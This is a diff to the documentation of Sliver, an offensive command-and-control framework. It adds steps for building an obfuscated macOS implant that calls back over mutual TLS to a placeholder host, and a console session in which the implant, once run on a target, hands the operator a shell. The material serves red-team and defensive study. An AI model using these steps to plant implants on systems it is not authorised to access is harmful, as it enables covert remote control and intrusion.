@@ -40,10 +40,20 @@ sliver > generate --mtls example.com --save /Users/moloch/Desktop
 [*] Symbol obfuscation is enabled, this process takes about 15 minutes
 [*] Build completed in 00:10:16
 [*] Sliver binary saved to: /Users/moloch/Desktop/NEW_GRAPE.exe
-
 ```
 
 __IMPORTANT:__ The symbol obfuscation process can take 15+ mintues to complete depending on your server's CPU resources. You can skip this step with `--skip-symbols` but a lot of sketchy information will end up in the binaries that get generated. You should only use this flag if you're just playing around, or do not care about stealth.
+
+Sliver implants are cross-platform, you can change the compiler target with the `--os` flag:
+
+```
+sliver > generate --mtls example.com --save /Users/moloch/Desktop --skip-symbols --os mac
+
+[*] Generating new darwin/amd64 Sliver binary
+[!] Symbol obfuscation is disabled
+[*] Build completed in 00:00:03
+[*] Sliver binary saved to: /Users/moloch/Desktop/PROPER_ANTHONY
+```
 
 The server will also assign codenames to each generated binary i.e. `NEW_GRAPE.exe` you can rename file to anything you need to but these codenames will still uniquely identify the generated binary. You can also view all previously generated implant binaries with the `slivers` command:
 
@@ -85,8 +95,23 @@ sliver > jobs
 ID  Name  Protocol  Port
 ==  ====  ========  ====
 1   mTLS  tcp       8888
-
-sliver >
 ```
 
+In this example we're using Mutual TLS, the required certificates for setting up and securing this connection have already been generated in the background and the client certificate pair was embedded into the implant at compile-time. So to get a shell you just have to run the binary on the target.
+
+```
+[*] Session #1 PROPER_ANTHONY - 127.0.0.1:49929 (narvi.local) - darwin/amd64
+
+sliver > use 1
+
+[*] Active sliver PROPER_ANTHONY (1)
+
+sliver (PROPER_ANTHONY) > ls
+
+/Users/moloch/Desktop
+=====================
+.DS_Store                 6.0 KiB
+.localized                0 B
+PROPER_ANTHONY            6.3 MiB
+```
 
